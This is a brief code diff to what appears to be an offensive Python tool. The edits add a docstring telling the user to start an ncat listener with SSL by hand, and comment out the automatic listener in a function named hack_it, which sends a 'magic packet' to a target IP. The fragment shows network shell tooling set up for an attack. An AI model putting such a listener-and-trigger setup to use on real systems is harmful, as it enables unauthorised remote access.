@@ -92,12 +92,14 @@ def start_listening_terminal(listen_port, ssl=True):
     """
     Start listening with ncat on specified port.
     With or without ssl option (should always be True!!!)
+    (Note: Currently not working. just use a terminal for now and type
+    the command ncat -vklp <port> --ssl)
     :param listen_port: int
     :param ssl: bool
     :return: None
     """
     print("This function is not yet working!!!")
-    
+
     # Create the main command to run in the new terminal
     ncat_command = "{} -vklp {}".format(NCAT_PATH, listen_port)
     ncat_command = ncat_command + " --ssl" if ssl else ncat_command
@@ -137,8 +139,8 @@ def hack_it():
     :return: None
     """
     # Start Listening
-    listen(LISTEN_PORT)
-    time.sleep(3)
+    # listen(LISTEN_PORT)
+    # time.sleep(3)
 
     # Create and send magic packet
     p = generate_magic_packet(DEST_IP)  # tcp=False
